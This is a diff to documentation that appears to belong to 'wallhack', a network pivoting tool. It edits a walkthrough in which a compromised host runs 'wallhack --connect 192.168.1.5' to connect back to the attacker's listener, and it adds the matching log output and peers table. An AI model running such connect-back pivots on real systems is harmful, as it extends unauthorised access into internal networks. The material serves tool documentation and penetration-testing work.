@@ -25,6 +25,7 @@ wallhack> info
 role:              entry
 listen addr:       :6565
 version:           wallhack 0.6.2
+cli:               wallhack 0.6.2
 uptime:            2s
 ```
 {% /step %}
@@ -34,14 +35,21 @@ Connecting back to the attacker. With no TUN capability available, the node nego
 
 {% codeblock code="wallhack --connect 192.168.1.5" /%}
 
+On the compromised host (headless, no TTY):
+
+```
+info: Connecting to 192.168.1.5...
+info: Connected to 192.168.1.5:6565
+```
+
 Back on the attacker, the REPL shows the connection:
 
 ```
 [+] peer "pivot" connected (10.0.1.5:52341)
 
 wallhack> peers
-NAME   ADDR              STATUS     LATENCY  TUN  LISTEN  CONNECT
-pivot  10.0.1.5:52341    connected  1.2ms    no   no      yes
+NAME   ADDR             STATUS     LATENCY  TUN  LISTEN  CONNECT
+pivot  10.0.1.5:52341   connected  1.2ms    no   no      yes
 ```
 {% /step %}
 
